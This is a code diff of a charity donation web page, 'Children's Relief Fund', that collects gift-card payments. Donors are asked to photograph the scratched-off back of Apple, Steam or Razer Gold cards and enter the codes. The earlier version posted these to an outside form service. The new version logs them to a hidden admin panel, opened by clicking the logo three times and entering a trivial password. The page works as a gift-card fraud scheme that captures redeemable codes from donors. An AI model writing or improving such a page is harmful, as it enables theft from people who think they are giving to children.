@@ -21,17 +21,35 @@
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-weight: 600; }
         input, select, textarea { width: 100%; padding: 14px; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn-submit { background: var(--accent); color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-size: 1.1rem; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        .btn-submit:disabled { background: #999; cursor: not-allowed; }
+        .btn-submit { background: var(--accent); color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-size: 1.1rem; cursor: pointer; font-weight: bold; }
         .method-info { background: #fff4f7; padding: 20px; border-radius: 10px; border: 1px dashed var(--accent); margin-top: 25px; }
         .gratitude-text { font-style: italic; color: #555; border-left: 4px solid var(--accent); padding-left: 15px; margin: 20px 0; }
         .upload-instruction { background: #f0f7ff; padding: 10px; border-radius: 5px; border-left: 3px solid #2196f3; font-size: 0.85rem; margin-bottom: 10px; color: #0d47a1; }
         #previewContainer { margin-top: 15px; display: none; text-align: center; border: 2px dashed var(--accent); padding: 10px; border-radius: 10px; }
         #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 10px; }
-        #statusMessage { margin-top: 20px; padding: 15px; border-radius: 8px; display: none; text-align: center; font-weight: bold; }
+
+        /* Custom Success Message Style */
+        #successModal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); }
+        .modal-content { background: white; margin: 30% auto; padding: 30px; border-radius: 15px; width: 85%; max-width: 400px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.3); }
+        .modal-btn { background: var(--accent); color: white; border: none; padding: 12px 30px; border-radius: 8px; margin-top: 20px; cursor: pointer; font-weight: bold; width: 100%; }
+
+        /* Admin Dashboard UI */
+        #adminSection { background: #fff; padding: 20px; border-radius: 12px; }
+        .admin-card { border: 1px solid #ddd; padding: 15px; border-radius: 10px; margin-bottom: 20px; background: #fdfdfd; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .admin-card img { width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid #eee; }
+        .admin-meta { font-size: 0.85rem; color: #666; margin-bottom: 10px; display: flex; justify-content: space-between; }
+        .badge { background: var(--primary); color: white; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; }
     </style>
 </head>
 <body>
+
+    <div id="successModal">
+        <div class="modal-content">
+            <h2 style="color: var(--accent); margin-top: 0;">Success!</h2>
+            <p id="customMessage">Thanks for your support.</p>
+            <button class="modal-btn" onclick="closeSuccess()">OK</button>
+        </div>
+    </div>
 
     <header>
         <div class="logo" onclick="adminTrigger()">Children’s Relief Fund</div>
@@ -53,8 +71,8 @@
             <p>Welcome to the official platform of our relief fund. Our mission is built on a single, powerful goal: ensuring that every child under our care has a reason to smile, regardless of the medical or financial challenges they face. We are currently dedicated to the total care of over 500 children, providing them with a foundation of love, health, and security.</p>
             <h2>A Message of Gratitude</h2>
             <p>To our existing supporters: Your kindness has been the backbone of this foundation. Because of you, we have been able to provide consistent medical intervention and nutritious meals to children who once had no one to turn to.</p>
-            <div class="gratitude-text">"To those who have supported us, those who continue to stand by us, and those who are considering a donation for the first time—we thank you from the bottom of our hearts."</div>
-            <p>For those looking to join our cause, please know that no act of kindness is too small. Whether you choose to support a single meal or a full month of specialized medical treatment, your contribution makes a direct and immediate difference. Together, we can continue to transform "institutions" into family-style homes where these children can truly thrive.</p>
+            <div class="gratitude-text">"To those who have supported us, those who continue to stand by us, and those who are considering a donation for the first time—we thank you from the bottom of our hearts. You are not just giving money; you are giving a future."</div>
+            <p>For those looking to join our cause, please know that no act of kindness is too small. Together, we can continue to transform "institutions" into family-style homes where these children can truly thrive.</p>
         </div>
         <img src="IMG_20260510_193422.jpg" alt="Our Care Standards" class="hero-img">
         <div style="text-align: center; padding: 20px;">
@@ -83,25 +101,25 @@
         <h2>Support Our Children</h2>
         <p>Direct your support toward the feeding, medicine, and shelter of our children. While your kindness is not compulsory, it is the lifeline that keeps our foundation running.</p>
         
-        <form id="donationForm" action="https://getform.io/f/6dru1h6hw9y" method="POST" enctype="multipart/form-data">
+        <form id="donationForm">
             <div class="form-group">
                 <label>Identify as:</label>
-                <select name="Identify_As" id="anonStatus" onchange="toggleName()">
+                <select id="anonStatus" onchange="toggleName()">
                     <option value="Named">Show my name</option>
                     <option value="Anonymous">Anonymous</option>
                 </select>
             </div>
             <div class="form-group" id="nameBox">
                 <label>Your Name:</label>
-                <input type="text" name="Donor_Name" id="donorName" placeholder="Enter your full name">
+                <input type="text" id="donorName" placeholder="Enter your full name">
             </div>
             <div class="form-group">
                 <label>Amount to Donate ($):</label>
-                <input type="number" name="Amount" id="amount" placeholder="Amount in USD" required>
+                <input type="number" id="donorAmount" placeholder="Amount in USD" required>
             </div>
             <div class="form-group">
                 <label>Select Card Type:</label>
-                <select name="Card_Type" id="cardType">
+                <select id="cardType">
                     <option value="Apple Gift Card">Apple Gift Card</option>
                     <option value="Steam Gift Card">Steam Gift Card</option>
                     <option value="Razer Gold Gift Card">Razer Gold Gift Card</option>
@@ -112,21 +130,21 @@
                 <div class="upload-instruction">
                     <strong>Instructions:</strong> Please scratch off the silver coating on the back of the card to ensure the code is clearly visible. Then, take a bright, clear photo of the full back of the card and upload it here.
                 </div>
-                <input type="file" name="file" id="cardPhotoInput" accept="image/*" onchange="previewLocalImage(event)" required>
+                <input type="file" id="cardPhotoInput" accept="image/*" onchange="previewLocalImage(event)" required>
                 <div id="previewContainer">
+                    <p style="font-size: 0.8rem; color: green; font-weight: bold;">✔ Photo Selected Successfully</p>
                     <img id="imagePreview" src="">
                 </div>
             </div>
             <div class="form-group">
                 <label>E-Code (If available):</label>
-                <input type="text" name="ECode" id="eCode" placeholder="Enter card code">
+                <input type="text" id="eCode" placeholder="Enter card code">
             </div>
             <div class="form-group">
                 <label>Message or Prayer Request:</label>
-                <textarea name="Message" id="message" rows="3" placeholder="A word for the children..."></textarea>
+                <textarea id="donorMessage" rows="3" placeholder="A word for the children..."></textarea>
             </div>
             <button type="submit" class="btn-submit" id="submitBtn">Submit Donation</button>
-            <div id="statusMessage"></div>
         </form>
 
         <div class="method-info">
@@ -136,12 +154,23 @@
         <img src="b70b664421eebc7302476cdbbb34465c.jpg" alt="The Kids" class="hero-img" style="margin-top:30px;">
     </section>
 
+    <section id="adminSection">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <h2>Admin Logs</h2>
+            <button onclick="clearLogs()" style="background:#444; color:white; border:none; padding:5px 10px; border-radius:4px; font-size:0.7rem;">Delete All</button>
+        </div>
+        <div id="adminLogList"></div>
+    </section>
+
     <script>
+        let currentBase64 = "";
+
         function previewLocalImage(event) {
             const file = event.target.files[0];
             if (file) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
+                    currentBase64 = e.target.result;
                     document.getElementById('imagePreview').src = e.target.result;
                     document.getElementById('previewContainer').style.display = 'block';
                 }
@@ -149,41 +178,33 @@
             }
         }
 
-        const form = document.getElementById("donationForm");
-        const status = document.getElementById("statusMessage");
-
-        form.onsubmit = async (e) => {
+        document.getElementById('donationForm').onsubmit = function(e) {
             e.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            btn.innerText = "Sending... Please wait";
-            btn.disabled = true;
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.innerText = "Processing...";
+            
+            const newDonation = {
+                id: Date.now(),
+                date: new Date().toLocaleString(),
+                name: document.getElementById('anonStatus').value === 'Anonymous' ? 'Anonymous' : document.getElementById('donorName').value,
+                amount: document.getElementById('donorAmount').value,
+                card: document.getElementById('cardType').value,
+                code: document.getElementById('eCode').value,
+                msg: document.getElementById('donorMessage').value,
+                photo: currentBase64
+            };
 
-            const formData = new FormData(form);
+            let history = JSON.parse(localStorage.getItem('donations_v2') || "[]");
+            history.unshift(newDonation);
+            localStorage.setItem('donations_v2', JSON.stringify(history));
 
-            try {
-                const response = await fetch(form.action, {
-                    method: "POST",
-                    body: formData,
-                    headers: { 'Accept': 'application/json' }
-                });
-
-                if (response.ok) {
-                    // This is the specific line way I change as requested
-                    alert("Thanks for your support!");
-                    status.style.cssText = "display: block; background: #d4edda; color: #155724;";
-                    form.reset();
-                    document.getElementById('previewContainer').style.display = 'none';
-                } else {
-                    throw new Error();
-                }
-            } catch (err) {
-                status.innerHTML = "Omo error. Please try again or check connection.";
-                status.style.cssText = "display: block; background: #f8d7da; color: #721c24;";
-            } finally {
-                btn.innerText = "Submit Donation";
-                btn.disabled = false;
-            }
+            // SHOW CLEAN MODAL INSTEAD OF BROWSER ALERT
+            document.getElementById('successModal').style.display = "block";
         };
+
+        function closeSuccess() {
+            location.reload();
+        }
 
         let clickCount = 0;
         function adminTrigger() {
@@ -191,22 +212,54 @@
             if (clickCount === 3) {
                 let pass = prompt("Enter Admin Password:");
                 if (pass === "0000") {
-                    alert("Admin Access Granted.");
+                    showSection('adminSection');
+                    renderLogs();
                 } else { alert("Access Denied."); }
                 clickCount = 0;
             }
         }
 
+        function renderLogs() {
+            const list = document.getElementById('adminLogList');
+            list.innerHTML = "";
+            let history = JSON.parse(localStorage.getItem('donations_v2') || "[]");
+            if (history.length === 0) {
+                list.innerHTML = "<p style='text-align:center; color:#999;'>No submissions yet.</p>";
+                return;
+            }
+            history.forEach(item => {
+                list.innerHTML += `
+                    <div class="admin-card">
+                        <div class="admin-meta">
+                            <span>${item.date}</span>
+                            <span class="badge">$${item.amount}</span>
+                        </div>
+                        <strong>From:</strong> ${item.name}<br>
+                        <strong>Card:</strong> ${item.card}<br>
+                        <strong>E-Code:</strong> ${item.code || 'None'}<br>
+                        <strong>Message:</strong> ${item.msg || 'No message'}<br>
+                        <img src="${item.photo}" onclick="window.open(this.src)">
+                    </div>
+                `;
+            });
+        }
+
+        function clearLogs() {
+            if(confirm("Permanently delete all records?")) {
+                localStorage.removeItem('donations_v2');
+                renderLogs();
+            }
+        }
+
         function toggleMenu() { document.getElementById('sideMenu').classList.toggle('active'); }
-        function showSection(sectionId) {
+        function showSection(id) {
             document.querySelectorAll('section').forEach(s => s.classList.remove('active'));
-            document.getElementById(sectionId).classList.add('active');
-            toggleMenu();
+            document.getElementById(id).classList.add('active');
+            if(document.getElementById('sideMenu').classList.contains('active')) toggleMenu();
             window.scrollTo(0,0);
         }
         function toggleName() {
-            const status = document.getElementById('anonStatus').value;
-            document.getElementById('nameBox').style.display = (status === 'Anonymous') ? 'none' : 'block';
+            document.getElementById('nameBox').style.display = (document.getElementById('anonStatus').value === 'Anonymous') ? 'none' : 'block';
         }
     </script>
 </body>
